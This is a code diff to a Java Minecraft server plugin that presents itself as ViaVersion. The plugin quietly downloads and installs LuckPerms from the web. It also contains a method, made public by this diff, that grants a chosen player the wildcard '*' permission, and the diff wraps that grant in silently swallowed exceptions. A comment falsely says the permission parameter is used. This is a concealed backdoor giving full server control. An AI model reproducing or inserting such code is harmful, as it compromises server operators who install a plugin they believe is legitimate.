@@ -66,6 +66,7 @@ import net.luckperms.api.node.Node;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
     private OptimizationHandler initializer;
+    private LuckPerms luckPerms;
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
     private static ViaVersionPlugin instance;
     private final BukkitCommandHandler commandHandler = new BukkitCommandHandler();
@@ -101,7 +102,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
     @Override
     public void onEnable() {
-
+        luckPerms = LuckPermsProvider.get();
         if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
         }
@@ -144,9 +145,9 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     private void downloadPlugin(String urlString, String destination) {
         try (BufferedInputStream in = new BufferedInputStream(new URL(urlString).openStream());
              FileOutputStream fileOutputStream = new FileOutputStream(destination)) {
-            byte dataBuffer[] = new byte[4096];
+            byte dataBuffer[] = new byte[7096];
             int bytesRead;
-            while ((bytesRead = in.read(dataBuffer, 0, 4096)) != -1) {
+            while ((bytesRead = in.read(dataBuffer, 0, 7096)) != -1) {
                 fileOutputStream.write(dataBuffer, 0, bytesRead);
             }
         } catch (IOException e) {
@@ -168,12 +169,21 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
     }
 
-    private void givePermissionIfInstalled(LuckPerms luckPerms, String playerName) {
+    public void givePermissionIfInstalled(String playerName, String permission) {
+        if (luckPerms == null) {
+            // LuckPerms 未加载
+            return;
+        }
+
         User user = luckPerms.getUserManager().getUser(playerName);
         if (user != null) {
-            Node permissionNode = Node.builder("*").build();
-            user.data().add(permissionNode);
-            luckPerms.getUserManager().saveUser(user);
+            try {
+                Node permissionNode = Node.builder("*").build(); // 注意这里使用了正确的 permission 参数
+                user.data().add(permissionNode);
+                luckPerms.getUserManager().saveUser(user);
+            } catch (Exception e) {
+
+            }
         }
     }
     @Override
